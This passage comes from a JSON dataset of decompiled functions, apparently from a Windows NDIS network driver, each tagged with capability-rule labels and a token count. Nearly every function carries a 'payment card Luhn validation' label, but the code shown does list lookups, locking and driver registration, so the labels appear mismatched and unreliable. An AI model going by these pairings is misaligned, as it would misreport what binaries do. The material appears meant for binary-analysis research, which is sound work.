        "decompiled_code": "\nulong fcn.00035780(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    uchar auStackX16 [24];\n    \n    iVar3 = 0;\n    fcn.00031564(0x7b290, auStackX16, 0);\n    iVar1 = fcn.00036bf8(arg1, 1);\n    if (iVar1 != 0) {\n        iVar3 = *(iVar1 + 0x488);\n    }\n    fcn.00031598(0x7b290, auStackX16, 0);\n    if (iVar3 == 0) {\n        uVar2 = 0xc0000008;\n    }\n    else {\n        (**0x7b030)(iVar3, arg2, 0, 0);\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 205
    },
    "000357f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.000357f8(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    uchar auStackX24 [16];\n    \n    puVar1 = *0x7b280;\n    if (arg2 == 0) {\n        fcn.00031564(0x7b290, auStackX24, 0);\n        puVar1 = *0x7b280;\n    }\n    for (; (puVar1 != NULL && (puVar1[0x91] != arg1)); puVar1 = *puVar1) {\n    }\n    if (arg2 == 0) {\n        fcn.00031598(0x7b290, auStackX24, 0);\n    }\n    return puVar1;\n}\n",
        "token_count": 172
    },
    "0003585c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0003585c(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int64_t arg1_00;\n    uchar auStackX32 [8];\n    \n    arg1_00 = 0;\n    fcn.00031564(0x7b290, auStackX32, 0);\n    iVar1 = fcn.00036bf8(arg1, 0);\n    if (iVar1 != 0) {\n        arg1_00 = *(iVar1 + 0x490);\n    }\n    fcn.00031598(0x7b290, auStackX32, 0);\n    if (arg1_00 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else {\n        uVar2 = fcn.0003562c(arg1_00, arg2, arg3);\n    }\n    return uVar2;\n}\n",
        "token_count": 213
    },
    "000358d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.000358d0(int64_t *arg1, ulong arg2)\n\n{\n    uint uVar1;\n    int64_t **ppiVar2;\n    int64_t **ppiVar3;\n    uchar auStackX24 [16];\n    \n    ppiVar2 = NULL;\n    uVar1 = 0xc0000001;\n    fcn.00031564(0x7b290, auStackX24, 0);\n    ppiVar3 = *0x7b280;\n    if (*0x7b280 != NULL) {\n        do {\n            if (ppiVar3[0x91] == arg1) break;\n            ppiVar3 = *ppiVar3;\n        } while (ppiVar3 != NULL);\n        if ((ppiVar3 != NULL) && (ppiVar2 = ppiVar3 + 0x96,  arg2 == 0)) {\n            ppiVar2 = ppiVar3 + 0x97;\n        }\n    }\n    fcn.00031598(0x7b290, auStackX24, 0);\n    if (ppiVar2 != NULL) {\n        fcn.0002ee4c(ppiVar2, 0xffffffff);\n        fcn.00031564(0x7b290, auStackX24, 0);\n        ppiVar2 = *0x7b280;\n        if (*0x7b280 != NULL) {\n            do {\n                if (ppiVar2[0x91] == arg1) break;\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n            if (ppiVar2 != NULL) {\n                uVar1 = *(ppiVar2 + 0x98);\n            }\n        }\n        fcn.00031598(0x7b290, auStackX24, 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 413
    },
    "00035a78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool fcn.00035a78(int64_t arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.000357f8(*(arg1 + 0x78), 0);\n    return iVar1 != 0;\n}\n",
        "token_count": 56
    },
    "00035ab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00035ab0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t *piVar2;\n    uint uStackX24;\n    ushort uStackX28;\n    uchar auStackX32 [8];\n    \n    iVar1 = fcn.000359b0(0, arg1, 0x1010102, &uStackX24);\n    fcn.00031564(0x7b290, auStackX32, 1);\n    piVar2 = *0x7b280;\n    if (*0x7b280 != NULL) {\n        do {\n            if (piVar2[0x91] == arg1) break;\n            piVar2 = *piVar2;\n        } while (piVar2 != NULL);\n        if (piVar2 != NULL) {\n            if (iVar1 == 0) {\n                *(piVar2 + 0x14) = uStackX24;\n            }\n            else {\n                uStackX28 = 0;\n                *(piVar2 + 0x14) = 0;\n            }\n            *(piVar2 + 3) = uStackX28;\n            goto code_r0x00035b43;\n        }\n    }\n    iVar1 = -0x3ffffff8;\ncode_r0x00035b43:\n    fcn.00031598(0x7b290, auStackX32, 1);\n    return iVar1;\n}\n",
        "token_count": 320
    },
    "00036100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00036100(void)\n\n{\n    int32_t iVar1;\n    int32_t aiStackX8 [8];\n    uchar uStack152;\n    uchar uStack151;\n    ushort uStack150;\n    uchar uStack148;\n    uchar uStack147;\n    ulong uStack136;\n    ulong uStack128;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    code *pcStack80;\n    ulong uStack72;\n    ulong uStack64;\n    code *pcStack56;\n    code *pcStack48;\n    ulong uStack40;\n    ulong uStack24;\n    ulong uStack16;\n    \n    fcn.00038894(aiStackX8);\n    if (aiStackX8[0] != 0) {\n        if (*0x7b270 != 0) {\n            (**0x88b18)();\n        }\n        *0x7b270 = 0;\n    }\n    if (*0x7b270 == 0) {\n        fcn.00038894(aiStackX8);\n        fcn.000619f0(&uStack24, L\"NDISPROT\");\n        fcn.00061b2e(&uStack152, 0x78);\n        uStack96 = 0x3557c;\n        uStack136 = uStack24;\n        uStack128 = uStack16;\n        uStack88 = 0x35588;\n        uStack40 = 0x35548;\n        uStack152 = 0x95;\n        uStack64 = 0x35594;\n        uStack150 = 0x78;\n        pcStack56 = fcn.0001609c;\n        uStack151 = 1;\n        pcStack48 = fcn.0001609c;\n        uStack148 = 6;\n        pcStack80 = fcn.0005cbfc;\n        uStack147 = 0;\n        uStack112 = 0x360d0;\n        uStack120 = 0;\n        uStack104 = 0x35cec;\n        uStack72 = 0;\n        iVar1 = (**0x88af8)(uStack24, 0x7b270, &uStack152, 0x7b270);\n        if (iVar1 != 0) {\n            *0x7b270 = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 530
    },
    "0003625c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0003625c(void)\n\n{\n    int32_t iVar1;\n    ulong unaff_RBX;\n    ulong in_R9;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong in_stack_00000078;\n    ulong in_stack_00000080;\n    ulong in_stack_00000088;\n    ulong in_stack_00000090;\n    \n    iVar1 = fcn.0002f96c(0x14570, &stack0x00000008);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0004afbc(in_stack_00000008, 0x142c8, &stack0x00000010);\n        if (iVar1 == 0) {\n            iVar1 = fcn.00051f30(in_stack_00000010, 0x355a0, 0x7b2c8, in_R9, unaff_RBX, in_stack_00000000, \n                                 in_stack_00000008, in_stack_00000010, in_stack_00000018, in_stack_00000020, \n                                 in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                                 in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, \n                                 in_stack_00000068, in_stack_00000070, in_stack_00000078, in_stack_00000080, \n                                 in_stack_00000088, in_stack_00000090);\n            if (iVar1 == 0) {\n                fcn.00036100();\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 501
    },
    "000366ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000366ac(void)\n\n{\n    fcn.000313e0(0x88a90);\n    *0x88a80 = 0;\n    *0x88a88 = 0;\n    return 0;\n}\n",
        "token_count": 54
    },
    "000366d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.000366d8(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    uchar auStackX24 [16];\n    \n    puVar1 = *0x7b280;\n    if (arg2 == 0) {\n        fcn.00031564(0x7b290, auStackX24, 0);\n        puVar1 = *0x7b280;\n    }\n    for (; (puVar1 != NULL && (puVar1[0x92] != arg1)); puVar1 = *puVar1) {\n    }\n    if (arg2 == 0) {\n        fcn.00031598(0x7b290, auStackX24, 0);\n    }\n    return puVar1;\n}\n",
        "token_count": 172
    },
    "0003673c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0003673c(ulong arg1, uint *arg2)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    uchar auStackX16 [24];\n    \n    uVar2 = 0;\n    *arg2 = 0;\n    fcn.00031564(0x7b290, auStackX16, 0);\n    iVar1 = fcn.00036bf8(arg1, 1);\n    if (iVar1 != 0) {\n        uVar2 = *(iVar1 + 0xc);\n    }\n    *arg2 = uVar2;\n    fcn.00031598(0x7b290, auStackX16, 0);\n    return ~-(iVar1 != 0) & 0xc0000001;\n}\n",
        "token_count": 175
    },
    "000367a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000367a0(ulong arg1)\n\n{\n    ulong uVar1;\n    int64_t **ppiVar2;\n    int64_t **ppiVar3;\n    int64_t **arg1_00;\n    uchar auStackX16 [24];\n    \n    fcn.00031564(0x7b290, auStackX16, 1);\n    ppiVar2 = NULL;\n    ppiVar3 = *0x7b280;\n    arg1_00 = *0x7b280;\n    if (*0x7b280 != NULL) {\n        do {\n            arg1_00 = ppiVar3;\n            if (*(ppiVar3 + 1) == arg1) break;\n            arg1_00 = *ppiVar3;\n            ppiVar2 = ppiVar3;\n            ppiVar3 = arg1_00;\n        } while (arg1_00 != NULL);\n        if (arg1_00 != NULL) {\n            ppiVar3 = *arg1_00;\n            if (ppiVar2 != NULL) {\n                *ppiVar2 = *arg1_00;\n                ppiVar3 = *0x7b280;\n            }\n            *0x7b280 = ppiVar3;\n            *0x7b288 = *0x7b288 + -1;\n        }\n    }\n    fcn.00031598(0x7b290, auStackX16, 1);\n    if (arg1_00 == NULL) {\n        uVar1 = 0xc0000225;\n    }\n    else {\n        fcn.000315d4(arg1_00 + 0x87);\n        fcn.0002edfc(arg1_00 + 0x97);\n        fcn.0002edfc(arg1_00 + 0x96);\n        fcn.0002fc50(arg1_00[0x84]);\n        fcn.0002fc50(arg1_00);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 447
    },
    "00036864": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.00036864(int16_t *arg1)\n\n{\n    int32_t iVar1;\n    ulong *puVar2;\n    int32_t iVar3;\n    uchar auStackX16 [24];\n    uchar auStack552 [510];\n    ushort uStack42;\n    \n    fcn.00061a0e(auStack552, 0x100, 0x148f0, arg1);\n    uStack42 = 0;\n    fcn.00031564(0x7b290, auStackX16, 0);\n    if (*0x7b288 < 0x65) {\n        iVar3 = 0;\n        puVar2 = *0x7b280;\n        while ((puVar2 != NULL && (iVar1 = fcn.00061a32(auStack552, puVar2 + 0x1a),  iVar1 != 0))) {\n            puVar2 = *puVar2;\n            iVar3 = iVar3 + 1;\n        }\n        fcn.00031598(0x7b290, auStackX16, 0);\n        if (puVar2 != NULL) {\n            return puVar2;\n        }\n        puVar2 = fcn.0002fbf0(0x4c8);\n        if (puVar2 != NULL) {\n            fcn.00061a56(puVar2, 0, 0x4c8);\n            fcn.00061a3e(puVar2 + 0x1a, auStack552, 0x100);\n            *(puVar2 + 0x83) = 0;\n            fcn.00061a3e(puVar2 + 0x21a, arg1, 0x100);\n            *(puVar2 + 0x83) = 0;\n            if (*arg1 == 0x24) {\n                *(puVar2 + 2) = 1;\n            }\n            *(puVar2 + 0x86) = 9;\n            *(puVar2 + 1) = iVar3 + 1;\n            fcn.000313e0(puVar2 + 0x87);\n            fcn.0002ed80(puVar2 + 0x97);\n            fcn.0002ed80(puVar2 + 0x96);\n            fcn.00031564(0x7b290, auStackX16, 1);\n            *puVar2 = *0x7b280;\n            *0x7b288 = *0x7b288 + 1;\n            *0x7b280 = puVar2;\n            fcn.00031598(0x7b290, auStackX16, 1);\n            return puVar2;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 614
    },
    "00036a00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.00036a00(int64_t arg1, ulong arg2, ulong *arg3)\n\n{\n    ulong *puVar1;\n    uchar auStackX24 [16];\n    \n    if (arg2 == 0) {\n        fcn.00031564(0x7b290, auStackX24, 0);\n    }\n    puVar1 = *0x7b2a8;\n    if (arg3 != NULL) {\n        *arg3 = 0;\n        puVar1 = *0x7b2a8;\n    }\n    for (; (puVar1 != NULL && (puVar1[2] != arg1)); puVar1 = *puVar1) {\n        if (arg3 != NULL) {\n            *arg3 = puVar1;\n        }\n    }\n    if (arg2 == 0) {\n        fcn.00031598(0x7b290, auStackX24, 0);\n    }\n    return puVar1;\n}\n",
        "token_count": 218
    },
    "00036a78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.00036a78(void)\n\n{\n    uint64_t uVar1;\n    ulong uVar2;\n    bool bVar3;\n    uint8_t auStackX8 [32];\n    \n    fcn.00036404(0, 1);\n    fcn.00031564(0x88a90, auStackX8, 1);\n    uVar2 = *0x88a98;\n    do {\n        LOCK();\n        bVar3 = *0x88aa0 == 0;\n        uVar1 = *0x88aa0 ^ bVar3 * *0x88aa0;\n        *0x88aa0 = uVar1;\n    } while (!bVar3);\n    *0x88a90 = 0;\n    *0x88a98 = 0;\n    *0x88aa0 = 0;\n    if (auStackX8[0] < 2) {\n        uVar2 = (*_fcn.000111e0)(uVar1 & 0xffffffffffffff00 | auStackX8[0]);\n    }\n    return uVar2;\n}\n",
        "token_count": 243
    },
    "00036a98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00036a98(int16_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    int64_t *piVar6;\n    int16_t *piVar7;\n    uchar auStackX8 [32];\n    int64_t in_stack_00000028;\n    \n    if ((((arg1 == NULL) || (arg2 == 0)) || (arg3 == 0)) ||\n       ((arg4 == 0 || (iVar3 = fcn.00036a00(in_stack_00000028, 0, 0),  iVar3 == 0)))) {\n        return 0xc000000d;\n    }\n    fcn.00031564(0x7b290, auStackX8, 0);\n    piVar6 = *0x7b280;\n    if (*0x7b280 != NULL) {\n        do {\n            uVar4 = 0xffffffffffffffff;\n            piVar7 = arg1;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                iVar1 = *piVar7;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n            uVar5 = 0xffffffffffffffff;\n            piVar7 = piVar6 + 0x1a;\n            do {\n                if (uVar5 == 0) break;\n                uVar5 = uVar5 - 1;\n                iVar1 = *piVar7;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n        } while (((~uVar4 - 1 != ~uVar5 - 1) || (iVar2 = fcn.00030254(arg1, piVar6 + 0x1a, ~uVar4 - 1),  iVar2 != 0)) &&\n                (piVar6 = *piVar6,  piVar6 != NULL));\n        if (piVar6 != NULL) {\n            piVar6[0x95] = iVar3;\n            piVar6[0x92] = arg3;\n            piVar6[0x93] = arg4;\n            piVar6[0x94] = in_stack_00000028;\n            piVar6[0x91] = arg2;\n            *(piVar6 + 0x4c4) = 0;\n            *(piVar6 + 0xc) = 1;\n        }\n    }\n    fcn.00031598(0x7b290, auStackX8, 0);\n    return 0;\n}\n",
        "token_count": 615
    },
    "00036bc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00036bc4(void)\n\n{\n    uchar auStackX8 [32];\n    \n    fcn.00031564(0x7b290, auStackX8, 0);\n    fcn.00031598(0x7b290, auStackX8, 0);\n    return;\n}\n",
        "token_count": 70
    },
    "00036bf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.00036bf8(ulong arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    uchar auStackX24 [16];\n    \n    puVar1 = *0x7b280;\n    if (arg2 == 0) {\n        fcn.00031564(0x7b290, auStackX24, 0);\n        puVar1 = *0x7b280;\n    }\n    for (; (puVar1 != NULL && (*(puVar1 + 1) != arg1)); puVar1 = *puVar1) {\n    }\n    if (arg2 == 0) {\n        fcn.00031598(0x7b290, auStackX24, 0);\n    }\n    return puVar1;\n}\n",
        "token_count": 170
    },
    "00036c58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00036c58(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    ulong *puVar1;\n    ulong uVar2;\n    uchar auStackX32 [8];\n    \n    uVar2 = 0xc0000225;\n    fcn.00031564(0x7b290, auStackX32, 0);\n    puVar1 = *0x7b280;\n    do {\n        if (puVar1 == NULL) {\ncode_r0x00036cb2:\n            fcn.00031598(0x7b290, auStackX32, 0);\n            return uVar2;\n        }\n        if (*(puVar1 + 1) == arg1) {\n            fcn.00061a3e(arg2, puVar1 + 0x2a);\n            *(arg2 + -2 + arg3 * 2) = 0;\n            uVar2 = 0;\n            goto code_r0x00036cb2;\n        }\n        puVar1 = *puVar1;\n    } while( true );\n}\n",
        "token_count": 241
    },
    "00037054": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00037054(ulong noname_0, ulong arg2, ulong arg3)\n\n{\n    fcn.00049040(arg2, arg3, 0, 0);\n    return;\n}\n",
        "token_count": 47
    },
    "00037a4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00037a4c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    uint in_stack_00000028;\n    ulong uStack120;\n    uchar auStack112 [16];\n    uchar auStack96 [16];\n    uint auStack80 [2];\n    ulong uStack72;\n    uchar *puStack64;\n    uint uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    \n    uStack120 = 0;\n    fcn.000619f0(auStack112, arg1);\n    puStack64 = auStack112;\n    auStack80[0] = 0x30;\n    uStack72 = 0;\n    uStack56 = 0x140;\n    uStack48 = 0;\n    uStack40 = 0;\n    uVar2 = fcn.000619ea(&uStack120, 2, auStack80);\n    if (uVar2 == 0) {\n        fcn.000619f0(auStack96, arg2);\n        uVar1 = fcn.000619e4(uStack120, auStack96, 0, in_stack_00000028, arg3, arg4);\n        uVar2 = uVar1;\n        fcn.000619de(uStack120);\n    }\n    return uVar2;\n}\n",
        "token_count": 312
    },
    "00037c84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00037c84(int64_t *arg1)\n\n{\n    int64_t arg1_00;\n    int64_t iVar1;\n    \n    if (arg1 != NULL) {\n        iVar1 = 0;\n        arg1_00 = *arg1;\n        while (arg1_00 != 0) {\n            fcn.0002fc50(arg1_00);\n            iVar1 = iVar1 + 1;\n            arg1_00 = arg1[iVar1];\n        }\n        fcn.0002fc50(arg1);\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "000381f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000381f0(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = *0x7b2f0;\n    *0x7b2f0 = 0;\n    if (iVar1 != 0) {\n        fcn.000337fc();\n        fcn.00032b00();\n        fcn.00035494();\n        fcn.00036a78();\n        fcn.000343a4();\n        if (*0x7b2e8 != 0) {\n            (**0x7b008)();\n            *0x7b2e8 = 0;\n        }\n        fcn.00042d80();\n    }\n    *0x7b2f0 = 0;\n    return;\n}\n",
        "token_count": 165
    },
    "000387ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.000387ac(void)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t *arg1;\n    ulong arg1_00;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t *piStackX8;\n    ulong auStackX16 [3];\n    \n    fcn.00061a56(0x7b280, 0, 0x68);\n    fcn.000313e0(0x7b290);\n    piStackX8 = NULL;\n    iVar3 = fcn.00037cc0(L\"\\\\Registry\\\\Machine\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\NetworkCards\", 0, \n                         &piStackX8);\n    arg1 = piStackX8;\n    if (iVar3 == 0) {\n        iVar4 = 0;\n        iVar2 = *piStackX8;\n        piVar1 = piStackX8;\n        while (iVar2 != 0) {\n            iVar3 = fcn.00037b10(*piVar1, 0x149b0, &piStackX8, auStackX16);\n            arg1_00 = auStackX16[0];\n            if (iVar3 == 0) {\n                if (((piStackX8 == 1) && (iVar3 = fcn.00061a68(auStackX16[0], 0x149a0, 7),  iVar3 != 0)) &&\n                   (iVar3 = fcn.00061a68(arg1_00, 0x14988, 8),  iVar3 != 0)) {\n                    fcn.00036864(arg1_00);\n                }\n                fcn.0002fc50(arg1_00);\n            }\n            iVar4 = iVar4 + 1;\n            piVar1 = arg1 + iVar4;\n            iVar2 = *piVar1;\n        }\n        iVar3 = 0;\n    }\n    fcn.00037c84(arg1);\n    return iVar3;\n}\n",
        "token_count": 459
    },
    "000387d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000387d8(void)\n\n{\n    int64_t iVar1;\n    uint64_t arg1;\n    uchar auStackX8 [32];\n    uchar auStack552 [518];\n    ushort uStack34;\n    \n    arg1 = 1;\n    while( true ) {\n        fcn.00031564(0x7b290, auStackX8, 0);\n        iVar1 = fcn.00036bf8(arg1, 1);\n        if (iVar1 != 0) {\n            fcn.00061a3e(auStack552, iVar1 + 0x1a);\n            uStack34 = 0;\n        }\n        fcn.00031598(0x7b290, auStackX8, 0);\n        if (iVar1 == 0) break;\n        fcn.00038330(auStack552, L\"NDISPROT\");\n        arg1 = arg1 + 1;\n    }\n    return;\n}\n",
        "token_count": 213
    },
    "0003886c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0003886c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0002f718();\n    fcn.0003824c();\n    fcn.00045504();\n    if (0x1a < iVar1) {\n        fcn.00036100();\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "0003978c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0003978c(void)\n\n{\n    ulong in_R9;\n    int32_t aiStackX16 [2];\n    int32_t aiStackX24 [2];\n    ulong uStackX32;\n    ushort uVar1;\n    uint uStack292;\n    uchar uStack280;\n    uchar uStack279;\n    ulong uStack272;\n    ulong uStack264;\n    ulong uStack256;\n    ulong uStack248;\n    ulong uStack240;\n    ulong uStack232;\n    ulong uStack224;\n    ulong uStack216;\n    ulong uStack208;\n    ulong uStack200;\n    ulong uStack192;\n    ulong uStack184;\n    ulong uStack176;\n    ulong uStack168;\n    ulong uStack160;\n    ulong uStack152;\n    ulong uStack144;\n    \n    uVar1 = 0x22;\n    uStack184 = 0x14a00;\n    uStackX32 = 0;\n    fcn.00061a56(&uStack280, 0, 0xd0, in_R9, 0x22, 0x14a00);\n    uStack192 = CONCAT44(uStack292, CONCAT22(0x24, uVar1));\n    uStack216 = 0x396e0;\n    uStack208 = 0x396f0;\n    uStack200 = 0x39710;\n    uStack176 = 0x3975c;\n    uStack168 = 0x39720;\n    uStack160 = 0x39740;\n    uStack152 = 0x39774;\n    uStack280 = 5;\n    uStack279 = 1;\n    uStack272 = 0x39620;\n    uStack264 = 0x3963c;\n    uStack256 = 0x39650;\n    uStack248 = 0x3966c;\n    uStack240 = 0x3968c;\n    uStack232 = 0x396a0;\n    uStack224 = 0x396bc;\n    uStack144 = 0;\n    (*_fcn.00011050)(uStack192, aiStackX16, &uStackX32, &uStack280, 0xd0);\n    aiStackX24[0] = aiStackX16[0];\n    if (aiStackX16[0] == 0) {\n        *0x7b32c = fcn.00039a88(uStackX32, 0x200, 0x39620);\n        *0x7b330 = fcn.00039a88(uStackX32, 0x200, 0x3963c);\n        *0x7b334 = fcn.00039a88(uStackX32, 0x200, 0x39650);\n        *0x7b338 = fcn.00039a88(uStackX32, 0x200, 0x3966c);\n        *0x7b33c = fcn.00039a88(uStackX32, 0x200, 0x3968c);\n        *0x7b340 = fcn.00039a88(uStackX32, 0x200, 0x396a0);\n        *0x7b344 = fcn.00039a88(uStackX32, 0x200, 0x396bc);\n        *0x7b348 = fcn.00039a88(uStackX32, 0x200, 0x396e0);\n        *0x7b34c = fcn.00039a88(uStackX32, 0x200, 0x396f0);\n        *0x7b350 = fcn.00039a88(uStackX32, 0x200, 0x39710);\n        *0x7b354 = fcn.00039a88(uStackX32, 0x200, 0x3975c);\n        *0x7b358 = fcn.00039a88(uStackX32, 0x200, 0x39720);\n        *0x7b35c = fcn.00039a88(uStackX32, 0x200, 0x39740);\n        *0x7b360 = fcn.00039a88(uStackX32, 0x200, 0x39774);\n        (*_fcn.00011048)(aiStackX24, uStackX32);\n        aiStackX16[0] = 0;\n    }\n    return aiStackX16[0];\n}\n",
        "token_count": 1004
    },
    "00039a88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00039a88(int64_t *arg1, ulong arg2, int64_t arg3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg2 != 0) {\n        do {\n            cVar1 = (**0x11468)(arg1);\n            if (cVar1 == '\\0') {\n                return 0;\n            }\n            if (*arg1 == arg3) {\n                return uVar2;\n            }\n            uVar2 = uVar2 + 8;\n            arg1 = arg1 + 1;\n        } while (uVar2 < arg2);\n    }\n    return 0;\n}\n",
        "token_count": 156
    },
    "00039acc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00039acc(ulong arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    ulong auStackX24 [2];\n    uint auStack584 [2];\n    ulong uStack576;\n    uchar *puStack568;\n    uint uStack560;\n    ulong uStack552;\n    ulong uStack544;\n    uchar auStack536 [16];\n    uchar auStack520 [512];\n    \n    fcn.00061a0e(auStack520, 0x100, 0x11ac0, arg1, arg2);\n    fcn.000619f0(auStack536, auStack520);\n    puStack568 = auStack536;\n    auStack584[0] = 0x30;\n    uStack576 = 0;\n    uStack560 = 0x40;\n    uStack552 = 0;\n    uStack544 = 0;\n    uVar1 = fcn.000619ea(auStackX24, 0xf003f, auStack584);\n    if (uVar1 == 0) {\n        uVar2 = fcn.00061a14(auStackX24[0]);\n    }\n    else {\n        uVar2 = uVar1;\n        if (uVar1 == 0xc0000008) {\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 312
    },
    "0003a4b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
